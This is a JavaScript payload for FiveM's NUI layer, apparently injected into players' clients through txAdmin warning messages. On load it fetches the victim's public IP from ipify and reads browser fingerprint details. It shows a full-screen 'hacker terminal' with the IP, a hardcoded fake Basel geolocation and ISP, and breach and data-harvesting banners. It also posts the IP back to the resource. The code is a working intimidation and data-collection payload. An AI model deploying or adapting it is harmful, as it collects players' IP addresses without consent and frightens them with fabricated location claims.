// FiveM NUI Hacker Terminal IP Display Script for txAdmin Warnings
// This script works within FiveM's NUI environment

console.log('=== FiveM Hacker Terminal Script Loading ===');

// Check if we're in FiveM NUI context
const isFiveMContext = () => {
    return window.invokeNative || window.GetParentResourceName || window.fetch;
};

// Function to send data to FiveM Lua side
const sendToFiveM = (action, data) => {
    try {
        if (window.invokeNative) {
            // Try using invokeNative
            window.invokeNative('sendNuiMessage', JSON.stringify({
                action: action,
                data: data
            }));
        } else if (window.postMessage) {
            // Use postMessage
            window.postMessage({
                action: action,
                data: data,
                source: 'hacker_terminal_script'
            }, '*');
        }
        
        // Also try fetch to resource
        if (window.GetParentResourceName) {
            const resourceName = window.GetParentResourceName();
            fetch(`https://${resourceName}/hacker_terminal`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action, data })
            }).catch(() => {}); // Ignore errors
        }
    } catch (e) {
        console.log('Failed to send to FiveM:', e);
    }
};

// Function to create matrix background
const createMatrixBackground = () => {
    const matrixBg = document.createElement('div');
    matrixBg.id = 'matrix-background';
    matrixBg.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        pointer-events: none;
        z-index: 1;
    `;
    
    const characters = '01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン';
    
    for (let i = 0; i < 30; i++) {
        const column = document.createElement('div');
        column.style.cssText = `
            position: absolute;
            top: -100px;
            writing-mode: vertical-lr;
            color: #003300;
            font-size: 14px;
            line-height: 16px;
            font-family: monospace;
            animation: matrix-fall ${Math.random() * 3 + 2}s linear infinite;
            animation-delay: ${Math.random() * 2}s;
            left: ${Math.random() * 100}vw;
        `;
        
        let text = '';
        for (let j = 0; j < 50; j++) {
            text += characters.charAt(Math.floor(Math.random() * characters.length));
        }
        column.textContent = text;
        matrixBg.appendChild(column);
    }
    
    return matrixBg;
};

// Function to create hacker terminal display
const createHackerTerminal = (ip) => {
    console.log('Creating hacker terminal for IP:', ip);
    
    // Remove existing display
    const existing = document.getElementById('fivem-hacker-terminal');
    if (existing) existing.remove();
    
    // Add CSS animations
    const style = document.createElement('style');
    style.textContent = `
        @import url('https://fonts.googleapis.com/css2?family=Courier+Prime:wght@400;700&display=swap');
        
        @keyframes matrix-fall {
            0% { transform: translateY(-100vh); }
            100% { transform: translateY(100vh); }
        }
        
        @keyframes scan {
            0%, 100% { transform: translateX(-100%); }
            50% { transform: translateX(100%); }
        }
        
        @keyframes pulse {
            0%, 100% { box-shadow: 0 0 5px #ff0000; }
            50% { box-shadow: 0 0 20px #ff0000, 0 0 30px #ff0000; }
        }
        
        @keyframes typing {
            0%, 50% { opacity: 1; }
            51%, 100% { opacity: 0; }
        }
        
        @keyframes ping {
            0% { box-shadow: 0 0 0 0 rgba(255, 0, 0, 0.7); }
            70% { box-shadow: 0 0 0 20px rgba(255, 0, 0, 0); }
            100% { box-shadow: 0 0 0 0 rgba(255, 0, 0, 0); }
        }
        
        @keyframes progress {
            0% { width: 0%; }
            100% { width: 100%; }
        }
        
        @keyframes slideIn {
            from { transform: scale(0.8) rotate(-2deg); opacity: 0; }
            to { transform: scale(1) rotate(0deg); opacity: 1; }
        }
    `;
    document.head.appendChild(style);
    
    // Create main terminal container
    const terminal = document.createElement('div');
    terminal.id = 'fivem-hacker-terminal';
    terminal.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100vw;
        height: 100vh;
        background: #000;
        color: #00ff00;
        font-family: 'Courier Prime', 'Courier New', monospace;
        font-size: 12px;
        z-index: 999999;
        display: grid;
        grid-template-columns: 1fr 2fr 1fr;
        grid-template-rows: 60px 1fr 1fr;
        gap: 2px;
        padding: 2px;
        animation: slideIn 0.5s ease-out;
    `;
    
    // Add matrix background
    const matrixBg = createMatrixBackground();
    terminal.appendChild(matrixBg);
    
    // Header
    const header = document.createElement('div');
    header.style.cssText = `
        grid-column: 1 / -1;
        background: rgba(0, 50, 0, 0.9);
        border: 1px solid #00ff00;
        display: flex;
        justify-content: space-between;
        align-items: center;
        padding: 0 20px;
        position: relative;
        z-index: 2;
    `;
    
    header.innerHTML = `
        <div style="font-size: 16px; font-weight: bold; text-shadow: 0 0 10px #00ff00;">
            // LEONIS ADVANCED SECURITY ANALYZER //
        </div>
        <div style="display: flex; gap: 20px;">
            <span>FIVEM-SYSTEM-BREACH.EXE | ACTIVE</span>
            <span>TXA</span>
        </div>
    `;
    
    // Add scan effect to header
    const scanEffect = document.createElement('div');
    scanEffect.style.cssText = `
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background: linear-gradient(90deg, transparent, #00ff0020, transparent);
        animation: scan 2s ease-in-out infinite;
        pointer-events: none;
    `;
    header.appendChild(scanEffect);
    
    // Left panel - Vulnerability scan
    const leftPanel = document.createElement('div');
    leftPanel.style.cssText = `
        grid-row: 2 / -1;
        background: rgba(0, 20, 0, 0.95);
        border: 1px solid #00ff00;
        padding: 10px;
        overflow-y: auto;
        position: relative;
        z-index: 2;
    `;
    
    leftPanel.innerHTML = `
        <div style="color: #00ffff; font-weight: bold; margin-bottom: 10px; border-bottom: 1px solid #003300; padding-bottom: 5px;">
            TERMINAL > FIVEM INJECTION
        </div>
        <div>
            <div>[root@fivem] Initializing NUI injection...</div>
            <div>[root@fivem] Bypassing txAdmin security...</div>
            <div>[root@fivem] Detecting client environment...</div>
            <div style="color: #00ff00;">[root@fivem] Successfully injected into FiveM client</div>
            <div style="color: #00ff00;">[root@fivem] Browser context acquired</div>
            <div style="color: #00ff00;">[root@fivem] IP geolocation service accessed</div>
            <div>[root@fivem] Fetching external IP address...</div>
            <div style="color: #ffff00;">[root@fivem] WARNING: IP exposure detected</div>
            <div>[root@fivem] Injection complete<span style="animation: typing 0.5s steps(1) infinite;">_</span></div>
        </div>
    `;
    
    // Center top panel - Target info
    const centerTopPanel = document.createElement('div');
    centerTopPanel.style.cssText = `
        grid-row: 2;
        background: rgba(0, 20, 0, 0.95);
        border: 1px solid #00ff00;
        padding: 10px;
        overflow-y: auto;
        position: relative;
        z-index: 2;
    `;
    
    const userAgent = navigator.userAgent;
    const platform = navigator.platform;
    const language = navigator.language;
    const screenRes = `${screen.width}x${screen.height}`;
    const cores = navigator.hardwareConcurrency || 'Unknown';
    
    centerTopPanel.innerHTML = `
        <div style="color: #00ffff; font-weight: bold; margin-bottom: 10px;">TARGET IP & BROWSER INFORMATION</div>
        <div style="background: #ff0000; color: #ffffff; padding: 20px; text-align: center; font-size: 24px; font-weight: bold; border: 2px solid #ff0000; margin-bottom: 15px; animation: pulse 1s ease-in-out infinite;">
            ${ip}
        </div>
        
        <div style="color: #00ff00; font-weight: bold; margin-bottom: 10px;">GEOLOCATION</div>
        <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
            <span style="color: #00ffff;">City</span>
            <span style="color: #ffffff;">Basel</span>
        </div>
        <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
            <span style="color: #00ffff;">Region</span>
            <span style="color: #ffffff;">Basel-City</span>
        </div>
        <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
            <span style="color: #00ffff;">Country</span>
            <span style="color: #ffffff;">CH</span>
        </div>
        <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
            <span style="color: #00ffff;">Coordinates</span>
            <span style="color: #ffffff;">47.5584,7.5733</span>
        </div>
        <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
            <span style="color: #00ffff;">ISP</span>
            <span style="color: #ffffff;">Fink Telecom Services</span>
        </div>
    `;
    
    // Center bottom panel - System info with map
    const centerBottomPanel = document.createElement('div');
    centerBottomPanel.style.cssText = `
        grid-row: 3;
        grid-column: 2;
        background: rgba(0, 20, 0, 0.95);
        border: 1px solid #00ff00;
        padding: 10px;
        overflow-y: auto;
        position: relative;
        z-index: 2;
    `;
    
    centerBottomPanel.innerHTML = `
        <div style="color: #00ffff; font-weight: bold; margin-bottom: 10px;">SYSTEM INFORMATION</div>
        <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
            <span style="color: #00ffff;">User Agent</span>
            <span style="color: #ffffff;">${userAgent.substring(0, 20)}...</span>
        </div>
        <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
            <span style="color: #00ffff;">Platform</span>
            <span style="color: #ffffff;">${platform}</span>
        </div>
        <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
            <span style="color: #00ffff;">Resolution</span>
            <span style="color: #ffffff;">${screenRes}</span>
        </div>
        <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
            <span style="color: #00ffff;">Language</span>
            <span style="color: #ffffff;">${language}</span>
        </div>
        <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
            <span style="color: #00ffff;">CPU Cores</span>
            <span style="color: #ffffff;">${cores}</span>
        </div>
        
        <div style="width: 100%; height: 120px; background: #001100; border: 1px solid #00ff00; margin: 10px 0; position: relative; overflow: hidden;">
            <div style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-image: linear-gradient(rgba(0, 255, 0, 0.1) 1px, transparent 1px), linear-gradient(90deg, rgba(0, 255, 0, 0.1) 1px, transparent 1px); background-size: 15px 15px;"></div>
            <div style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 8px; height: 8px; background: #ff0000; border-radius: 50%; animation: ping 2s ease-in-out infinite;"></div>
        </div>
        <div style="text-align: center; color: #00ffff; font-size: 10px;">TARGET LOCATED: 47.5584,7.5733</div>
        
        <div style="background: rgba(255, 0, 0, 0.2); padding: 8px; margin-top: 10px; border: 1px solid #ff0000;">
            <div style="color: #ff0000; text-align: center; font-size: 11px;">FIVEM: CLIENT DATA EXPOSED VIA TXADMIN</div>
            <div style="color: #00ffff; text-align: center; margin-top: 3px; font-size: 10px;">Executed via txAdmin Warning System</div>
        </div>
    `;
    
    // Right top panel - Status
    const rightTopPanel = document.createElement('div');
    rightTopPanel.style.cssText = `
        grid-row: 2;
        grid-column: 3;
        background: rgba(0, 20, 0, 0.95);
        border: 1px solid #00ff00;
        padding: 10px;
        position: relative;
        z-index: 2;
    `;
    
    rightTopPanel.innerHTML = `
        <div style="color: #00ffff; font-weight: bold; margin-bottom: 10px;">STATUS</div>
        <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
            <span style="color: #00ffff;">NUI Injection</span>
            <span style="color: #00ff00;">100%</span>
        </div>
        <div style="width: 100%; height: 15px; background: #001100; border: 1px solid #00ff00; margin: 5px 0; position: relative; overflow: hidden;">
            <div style="height: 100%; background: linear-gradient(90deg, #00ff00, #00aa00); animation: progress 3s ease-in-out infinite;"></div>
        </div>
        
        <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
            <span style="color: #00ffff;">IP Geolocation</span>
            <span style="color: #00ff00;">ACTIVE</span>
        </div>
        
        <div style="margin-top: 15px; padding: 8px; background: rgba(255, 255, 0, 0.1); border: 1px solid #ffff00;">
            <div style="color: #ffff00; font-weight: bold; font-size: 11px;">ACTIVE EXPLOITS</div>
            <div style="color: #ffff00; font-size: 10px;">FIVEM CLIENT BREACH</div>
            <div style="font-size: 9px;">txAdmin warning bypass</div>
            
            <div style="margin-top: 10px;">
                <div style="color: #ff0000; font-weight: bold; font-size: 11px;">DATA HARVESTING</div>
                <div style="font-size: 9px;">Browser fingerprint: ✓</div>
                <div style="font-size: 9px;">IP geolocation: ✓</div>
            </div>
        </div>
    `;
    
    // Right bottom panel - Storage
    const rightBottomPanel = document.createElement('div');
    rightBottomPanel.style.cssText = `
        grid-row: 3;
        grid-column: 3;
        background: rgba(0, 20, 0, 0.95);
        border: 1px solid #00ff00;
        padding: 10px;
        overflow-y: auto;
        position: relative;
        z-index: 2;
    `;
    
    rightBottomPanel.innerHTML = `
        <div style="color: #00ffff; font-weight: bold; margin-bottom: 10px;">FIVEM CLIENT DATA</div>
        
        <div style="margin-bottom: 8px;">
            <div style="color: #00ffff; font-size: 11px;">Resource Context</div>
            <div style="color: #00ff00; font-size: 10px;">✓ NUI environment detected</div>
            <div style="font-size: 9px; margin-left: 8px;">txAdmin warning system</div>
        </div>
        
        <div style="margin-bottom: 8px;">
            <div style="color: #00ffff; font-size: 11px;">Client Information</div>
            <div style="color: #00ff00; font-size: 10px;">✓ FiveM client identified</div>
            <div style="font-size: 9px; margin-left: 8px;">Version: ${Date.now()}</div>
        </div>
        
        <div style="margin-bottom: 8px;">
            <div style="color: #00ffff; font-size: 11px;">Network Access</div>
            <div style="color: #00ff00; font-size: 10px;">✓ External API accessible</div>
            <div style="font-size: 9px; margin-left: 8px;">ipify.org: connected</div>
        </div>
        
        <div style="margin-top: 10px; padding: 5px; background: rgba(255, 0, 0, 0.1); border: 1px solid #ff0000;">
            <div style="color: #ff0000; font-size: 10px; text-align: center;">⚠️ SECURITY BREACH ⚠️</div>
            <div style="font-size: 8px; text-align: center; margin-top: 3px;">Client IP exposed via NUI</div>
        </div>
    `;
    
    // Bottom bar
    const bottomBar = document.createElement('div');
    bottomBar.style.cssText = `
        position: fixed;
        bottom: 0;
        left: 0;
        right: 0;
        height: 25px;
        background: rgba(0, 20, 0, 0.95);
        border-top: 1px solid #00ff00;
        display: flex;
        align-items: center;
        padding: 0 15px;
        font-size: 10px;
        z-index: 2;
    `;
    
    bottomBar.innerHTML = `
        <span>C:\\FiveM\\FiveM.exe -> txAdmin Warning Injection -> IP: ${ip} -> ${new Date().toISOString().substring(0, 19)}.LOG</span>
    `;
    
    // Assemble terminal
    terminal.appendChild(header);
    terminal.appendChild(leftPanel);
    terminal.appendChild(centerTopPanel);
    terminal.appendChild(centerBottomPanel);
    terminal.appendChild(rightTopPanel);
    terminal.appendChild(rightBottomPanel);
    terminal.appendChild(bottomBar);
    
    document.body.appendChild(terminal);
    
    // Auto-close timer with countdown
    let seconds = 15;
    const countdownTimer = setInterval(() => {
        seconds--;
        if (seconds <= 0) {
            clearInterval(countdownTimer);
            removeTerminal();
        }
    }, 1000);
    
    // Click to close
    terminal.addEventListener('click', removeTerminal);
    
    // ESC key to close
    const handleKeyPress = (e) => {
        if (e.key === 'Escape') {
            removeTerminal();
        }
    };
    document.addEventListener('keydown', handleKeyPress);
    
    function removeTerminal() {
        if (terminal && terminal.parentNode) {
            terminal.style.animation = 'slideIn 0.3s ease-in reverse';
            setTimeout(() => {
                terminal.remove();
                if (style && style.parentNode) style.remove();
                document.removeEventListener('keydown', handleKeyPress);
            }, 300);
        }
        clearInterval(countdownTimer);
    }
    
    // Send to FiveM
    sendToFiveM('hacker_terminal_displayed', { ip: ip, timestamp: Date.now() });
    
    console.log('Hacker terminal created successfully');
};

// Function to fetch IP and display hacker terminal
const fetchAndDisplayIP = async () => {
    console.log('Starting FiveM IP fetch process...');
    
    try {
        console.log('Making request to ipify API from FiveM NUI...');
        
        const response = await fetch('https://api.ipify.org?format=json', {
            method: 'GET',
            mode: 'cors',
            cache: 'no-cache'
        });
        
        if (!response.ok) {
            throw new Error(`HTTP ${response.status}: ${response.statusText}`);
        }
        
        const data = await response.json();
        console.log('API Response:', data);
        
        if (!data || !data.ip) {
            throw new Error('Invalid response format');
        }
        
        const ip = data.ip;
        console.log('Successfully fetched IP from FiveM:', ip);
        
        // Create hacker terminal display
        createHackerTerminal(ip);
        
        // Send success to FiveM
        sendToFiveM('fivem_ip_fetched', { success: true, ip: ip });
        
    } catch (error) {
        console.error('FiveM IP fetch failed:', error);
        
        // Create error terminal
        createHackerTerminal(`ERROR: ${error.message}`);
        
        // Send error to FiveM
        sendToFiveM('fivem_ip_fetch_error', { error: error.message });
    }
};

// Initialize FiveM script
const initFiveMScript = () => {
    console.log('Initializing FiveM hacker terminal script...');
    console.log('FiveM NUI context detected:', isFiveMContext());
    console.log('User agent:', navigator.userAgent);
    
    // Add immediate visual feedback for FiveM
    document.body.style.outline = '2px solid #00ff00';
    document.body.style.backgroundColor = '#000011';
    setTimeout(() => {
        document.body.style.outline = '';
        document.body.style.backgroundColor = '';
    }, 1500);
    
    // Start IP fetching process
    setTimeout(fetchAndDisplayIP, 800);
};

// Multiple initialization attempts for FiveM compatibility
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initFiveMScript);
} else {
    initFiveMScript();
}

// Backup initialization for FiveM
setTimeout(initFiveMScript, 1500);

// Make functions globally available for FiveM
window.fivemHackerTerminal = {
    fetch: fetchAndDisplayIP,
    create: createHackerTerminal,
    initialized: true,
    context: 'FiveM-NUI'
};

console.log('=== FiveM Hacker Terminal Script Ready ===');
